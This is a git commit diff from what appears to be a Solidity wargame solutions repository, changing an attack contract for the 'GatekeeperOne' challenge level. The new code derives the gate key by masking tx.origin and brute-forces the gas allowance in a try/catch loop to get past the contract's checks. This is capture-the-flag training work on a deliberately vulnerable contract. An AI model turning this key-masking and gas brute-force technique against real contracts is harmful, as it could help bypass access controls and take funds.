a9992993e686d0c6b369980369c08c5c7964c4b5
Kamil Chmielewski <chmielewski.kamil45@gmail.com>
2022-11-17 00:02:13 +0100

    🚧 build: WIP - experimenting

--- src/levels/13-GatekeeperOne/GatekeeperOneAttack.sol
+++ src/levels/13-GatekeeperOne/GatekeeperOneAttack.sol
@@ -5,13 +5,20 @@ import "./GatekeeperOne.sol";
 
 contract GatekeeperOneAttack is GatekeeperOne {
     GatekeeperOne gatekeeperOne;
+    uint256 public startGas;
+    uint256 public endGas;
 
     constructor(address _gatekeeperContract) public {
         gatekeeperOne = GatekeeperOne(_gatekeeperContract);
     }
 
     function attack() public {
-        bytes8 gateKey = bytes8(uint64(uint16(msg.sender)));
-        gatekeeperOne.enter{gas: 8191}(gateKey);
+        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) &
+            0xFFFFFFFF0000FFFF;
+        for (uint256 i = 0; i <= 300; i++) {
+            try gatekeeperOne.enter{gas: i + 8191 * 4}(gateKey) {
+                break;
+            } catch {}
+        }
     }
 }
